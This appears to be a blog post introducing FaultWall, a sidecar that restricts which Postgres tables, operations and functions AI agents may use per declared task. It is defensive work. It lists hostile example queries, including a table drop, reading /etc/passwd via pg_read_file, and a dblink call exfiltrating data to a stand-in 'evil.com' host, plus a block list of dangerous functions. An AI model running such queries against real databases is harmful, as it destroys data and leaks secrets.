I Gave an AI Agent My Database Password

March 2026 · 5 min read

TL;DR

AI agents connect to databases with real credentials. Postgres roles are too static to scope what an agent should do right now. I built FaultWall — a sidecar that enforces per-agent, per-task policies using a real Postgres AST parser. It blocks dangerous functions, restricts table access by mission, and kills violating queries. One Go binary, one YAML file, MIT licensed.

The Problem

I started giving AI agents direct Postgres access — data analysis, reports, automated ops. It's incredibly useful until the LLM generates a query without a WHERE clause, or picks the wrong table, or calls a function it shouldn't.

The scary part: the same agent credentials that run SELECT * FROM feedback can also run:

  • DROP TABLE users;
  • SELECT * FROM payments; — data it doesn't need
  • SELECT pg_read_file('/etc/passwd'); — read server files
  • SELECT dblink('host=evil.com ...') — exfiltrate to external server

Postgres doesn't know an AI generated the query. It just sees a valid connection with valid credentials.

This is the confused deputy problem. The agent is authorized to be there. The query it generates might not be.

Postgres roles don't solve it — they're static. An agent doing "summarize feedback" has the same permissions as when it's doing "delete old records." You need something that understands what the agent is supposed to be doing right now.

FaultWall

I built FaultWall — a sidecar that enforces per-agent, per-task database policies. Every agent identifies itself and declares its current task. FaultWall checks every query against that declaration.

# policies.yaml
agents:
  cursor-ai:
    missions:
      summarize-feedback:
        allowed_tables: [public.feedback]
        allowed_operations: [SELECT]
      update-shipping:
        allowed_tables: [public.orders]
        allowed_operations: [SELECT, UPDATE]

blocked_functions:
  - pg_sleep
  - lo_export
  - pg_read_file
  - dblink

Queries go through a real PostgreSQL AST parser (pg_query_go — the same C parser Postgres uses internally). No regex. It extracts operations, tables (including CTEs, subqueries, JOINs), and function calls. You can't sneak a pg_sleep(999) inside a SELECT past it.

faultwall — enforce mode
# Agent tries a table outside its mission
psql> SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
psql> SELECT * FROM public.users;
FATAL: terminating connection due to administrator command
Policy enforcement: BLOCKED agent=cursor-ai reason=table_not_in_mission
# Agent tries a dangerous function
psql> SELECT pg_read_file('/etc/passwd');
FATAL: terminating connection due to administrator command
Policy enforcement: BLOCKED reason=blocked_function:pg_read_file
# Agent stays within policy
psql> SELECT * FROM public.feedback WHERE created_at > now() - interval '30 days';
(47 rows) ✓

Tested against 11 real attack scenarios on a live Postgres instance — all passed. Table blocking, function blocking, operation restrictions, unregistered agent rejection, mission scoping.

Limitations

Being honest about what it doesn't do:

  • Polling, not proxying. FaultWall polls pg_stat_activity every ~10s. Short queries can complete before detection. Long-running agent workloads get caught.
  • Identity is self-reported. application_name is spoofable. A sophisticated attacker could impersonate a registered agent.

It's a seatbelt, not an airbag. Catches the 95% case — confused agents, bad prompts, scope creep. I have an early eBPF prototype (private repo, Linux-only) for real-time kernel-level interception, and cryptographic identity via signed JWTs. Neither is shipped yet.

If you're running agents against Postgres and want to see what they're actually doing:

docker run -e DATABASE_URL=postgres://user:pass@host:5432/db \
  -e POLICY_FILE=/app/policies.yaml \
  -e POLICY_ENFORCEMENT=monitor \
  -p 8080:8080 \
  ghcr.io/shreyasxv/faultwall:main

Per-agent metrics and violations at localhost:8080 in 30 seconds. Start in monitor mode, see what your agents do, flip to enforce when ready.
